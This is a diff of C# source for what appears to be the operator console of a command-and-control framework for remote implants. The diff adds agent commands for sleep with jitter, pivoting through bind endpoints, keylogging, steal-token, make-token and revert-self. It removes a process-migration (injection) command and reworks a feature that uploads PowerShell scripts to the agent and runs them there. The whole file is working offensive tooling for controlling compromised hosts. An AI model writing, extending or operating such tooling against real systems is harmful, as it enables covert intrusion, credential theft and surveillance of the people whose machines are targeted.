@@ -8,11 +8,18 @@ using System.IO;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
+using Common;
 
 namespace Commander.Commands.Agent
 {
     public abstract class EndPointCommand<T> : EnhancedCommand<T>
     {
+        public static string SLEEP = "sleep";
+        public static string META = "meta";
+
+        public static string ECHO = "echo";
+        public static string STEP = "step";
+
         public static string WHOAMI = "whoami";
         public static string DOWNLOAD = "download";
         public static string UPLOAD = "upload";
@@ -21,19 +28,18 @@ namespace Commander.Commands.Agent
         public static string PS = "ps";
         public static string PWD = "pwd";
         public static string TERMINATE = "terminate";
+        public static string DELAY = "delay";
 
         public static string SHELL = "shell";
         public static string START = "start";
         public static string RUN = "run";
 
-        public static string KEYLOG = "keylog";
+        
 
         public static string EXECUTEASSEMBLY = "execute-assembly";
         public static string SIDELOAD = "side-load";
 
-        public static string MIGRATE = "migrate";
-
-        public static string VERSION = "version";
+        //  public static string VERSION = "version";
         public static string IDLE = "idle";
         public static string CAT = "cat";
 
@@ -43,6 +49,17 @@ namespace Commander.Commands.Agent
         public static string POWERSHELL_IMPORT = "powershell-import";
 
         public static string WGET = "wget";
+        // public static string LINK = "link";
+        // public static string UNLINK = "unlink";
+
+        public static string SERVICE = "service";
+        public static string PIVOT = "pivot";
+        public static string KEYLOG = "keylog";
+
+        public static string MAKE_TOKEN = "make-token";
+        public static string REVERT_SELF = "revert-self";
+        public static string STEAL_TOKEN = "steal-token";
+
         public override string Category => CommandCategory.Core;
 
         public override RootCommand Command => new RootCommand(this.Description);
@@ -53,7 +70,7 @@ namespace Commander.Commands.Agent
             await context.CommModule.TaskAgent(context.CommandLabel, Guid.NewGuid().ToString(), agent.Metadata.Id, this.Name, context.CommandParameters);
 
 
-            context.Terminal.WriteSuccess($"Command {this.Name} tasked to agent {agent.Metadata.ShortId}.");
+            context.Terminal.WriteSuccess($"Command {this.Name} tasked to agent {agent.Metadata.Id}.");
         }
 
         protected override async Task<bool> HandleCommand(CommandContext<T> context)
@@ -82,12 +99,12 @@ namespace Commander.Commands.Agent
         public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;
     }
 
-    public class VersionCommand : EndPointCommand
-    {
-        public override string Description => "Get Version of the agent";
-        public override string Name => EndPointCommand.VERSION;
-        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;
-    }
+    /* public class VersionCommand : EndPointCommand
+     {
+         public override string Description => "Get Version of the agent";
+         public override string Name => EndPointCommand.VERSION;
+         public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;
+     }*/
 
     public class IdleCommand : EndPointCommand
     {
@@ -165,23 +182,7 @@ namespace Commander.Commands.Agent
 
         public override RootCommand Command => new RootCommand(this.Description)
             {
-                new Argument<string>("verb", () => "start", "Start | Stop").FromAmong("start", "stop"),
-            };
-    }
-
-    public class MigrateCommandOptions
-    {
-        public int processId { get; set; }
-    }
-    public class MigrateCommand : EndPointCommand<MigrateCommandOptions>
-    {
-        public override string Description => "Migrate the agent to an existing process";
-        public override string Name => EndPointCommand.MIGRATE;
-        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;
-
-        public override RootCommand Command => new RootCommand(this.Description)
-            {
-                new Argument<int>("processId", "Id of the process to inject"),
+                new Argument<string>("verb", "start | stop | show").FromAmong("start", "stop", "show"),
             };
     }
 
@@ -204,6 +205,20 @@ namespace Commander.Commands.Agent
     }
 
 
+    public class SleepCommand : EndPointCommand
+    {
+        public override string Description => "Change agent response time";
+        public override string Name => EndPointCommand.SLEEP;
+        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;
+
+        public override RootCommand Command => new RootCommand(this.Description)
+            {
+                new Argument<double?>("delay", () => null, "delay in seconds"),
+                new Argument<int?>("jitter", () => null, "jitter in percent"),
+            };
+    }
+
+
 
     public class PowershellImportCommandOptions
     {
@@ -219,36 +234,137 @@ namespace Commander.Commands.Agent
 
         public override RootCommand Command => new RootCommand(this.Description)
             {
-                new Argument<string>("scriptfile", () => "", "path of the script file to load"),
+                new Argument<string>("scriptfile", () => string.Empty, "path of the script file to load"),
             };
 
         protected override async Task<bool> HandleCommand(CommandContext<PowershellImportCommandOptions> context)
         {
-            if (!string.IsNullOrEmpty(context.Options.scriptfile) && !File.Exists(context.Options.scriptfile))
+
+            if (!string.IsNullOrEmpty(context.Options.scriptfile))
             {
-                context.Terminal.WriteError($"File {context.Options.scriptfile} not found");
-                return false;
+                if (!File.Exists(context.Options.scriptfile))
+                {
+                    context.Terminal.WriteError($"File {context.Options.scriptfile} not found");
+                    return false;
+                }
+                byte[] fileBytes = null;
+                using (FileStream fs = File.OpenRead(context.Options.scriptfile))
+                {
+                    fileBytes = new byte[fs.Length];
+                    fs.Read(fileBytes, 0, (int)fs.Length);
+                }
+
+                string fileName = Path.GetFileName(context.Options.scriptfile);
+
+                var fileId = await context.UploadAndDisplay(fileBytes, Path.GetFileName(fileName));
+
+                File.Delete(fileName);
+
+                await context.CommModule.TaskAgent(context.CommandLabel, Guid.NewGuid().ToString(), context.Executor.CurrentAgent.Metadata.Id, this.Name, fileId, fileName);
             }
-            byte[] fileBytes = null;
-            using (FileStream fs = File.OpenRead(context.Options.scriptfile))
-            {
-                fileBytes = new byte[fs.Length];
-                fs.Read(fileBytes, 0, (int)fs.Length);
-            }
+            else
+                await context.CommModule.TaskAgent(context.CommandLabel, Guid.NewGuid().ToString(), context.Executor.CurrentAgent.Metadata.Id, this.Name);
 
-            string fileName = Path.GetFileName(context.Options.scriptfile);
-            bool first = true;
-            var fileId = await context.CommModule.Upload(fileBytes, Path.GetFileName(fileName), a =>
-            {
-                context.Terminal.ShowProgress("uploading", a, first);
-                first = false;
-            });
-
-            File.Delete(fileName);
-
-            await context.CommModule.TaskAgent(context.CommandLabel, Guid.NewGuid().ToString(), context.Executor.CurrentAgent.Metadata.Id, this.Name, fileId, fileName);
-            context.Terminal.WriteSuccess($"Command {this.Name} tasked to agent {context.Executor.CurrentAgent.Metadata.ShortId}.");
+            context.Terminal.WriteSuccess($"Command {this.Name} tasked to agent {context.Executor.CurrentAgent.Metadata.Id}.");
             return true;
         }
     }
+
+
+    public class PivotCommandOptions
+    {
+        public string verb { get; set; }
+
+        public string bindto { get; set; }
+    }
+    public class LinkCommand : EndPointCommand<PivotCommandOptions>
+    {
+        public override string Description => "Manage Pivots";
+        public override string Name => EndPointCommand.PIVOT;
+        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;
+
+        public override RootCommand Command => new RootCommand(this.Description)
+        {
+            new Argument<string?>("verb", "start | stop | show").FromAmong("start", "stop", "show"),
+            new Option<string>(new[] { "--bindto", "-b" }, () => null, "Endpoint To bind to"),
+        };
+
+        const string StartVerb = "start";
+        const string StopVerb = "stop";
+        const string ShowVerb = "show";
+
+        protected override async Task<bool> HandleCommand(CommandContext<PivotCommandOptions> context)
+        {
+            var agent = context.Executor.CurrentAgent;
+            if (context.Options.verb == ShowVerb)
+            {
+                await context.CommModule.TaskAgent(context.CommandLabel, Guid.NewGuid().ToString(), agent.Metadata.Id, this.Name, context.CommandParameters);
+                context.Terminal.WriteSuccess($"Command {this.Name} tasked to agent {agent.Metadata.Id}.");
+                return true;
+            }
+
+
+            if (context.Options.verb == StartVerb || context.Options.verb == StopVerb)
+            {
+                if (string.IsNullOrEmpty(context.Options.bindto))
+                {
+                    context.Terminal.WriteError($"BindTo is required!");
+                    return false;
+                }
+
+                var url = context.Options.bindto;
+                ConnexionUrl conn = ConnexionUrl.FromString(url);
+                if(!conn.IsValid)
+                {
+                    context.Terminal.WriteError($"BindTo is not valid!");
+                    return false;
+                }
+
+                string commandArgs = $"{context.Options.verb} {context.Options.bindto}";
+
+                await context.CommModule.TaskAgent(context.CommandLabel, Guid.NewGuid().ToString(), agent.Metadata.Id, this.Name, commandArgs);
+                context.Terminal.WriteSuccess($"Command {this.Name} tasked to agent {agent.Metadata.Id}.");
+                return true;
+            }
+
+            return false;
+        }
+
+    }
+
+    /*public class LinkCommandOptions
+    {
+        public string Host { get; set; }
+        public int TargetAgent { get; set; }
+    }
+    public class LinkCommand : EndPointCommand<LinkCommandOptions>
+    {
+        public override string Description => "Link with the target agent on Pipe Communicator";
+        public override string Name => EndPointCommand.LINK;
+        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;
+
+        public override RootCommand Command => new RootCommand(this.Description)
+        {
+            new Argument<string?>("Host", () => null, "Ip of the agent"),
+            new Argument<string?>("agentId", () => null, "Id of the agent (long)"),
+        };
+
+    }*/
+
+    /*public class UnLinkCommandOptions
+    {
+        public int TargetAgent { get; set; }
+    }
+    public class UnLinkCommand : EndPointCommand<UnLinkCommandOptions>
+    {
+        public override string Description => "UnLink the target agent on Pipe Communicator";
+        public override string Name => EndPointCommand.UNLINK;
+        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;
+
+        public override RootCommand Command => new RootCommand(this.Description)
+        {
+            new Argument<string>("agentId", "Id of the agent (long)"),
+        };
+
+    }*/
 }
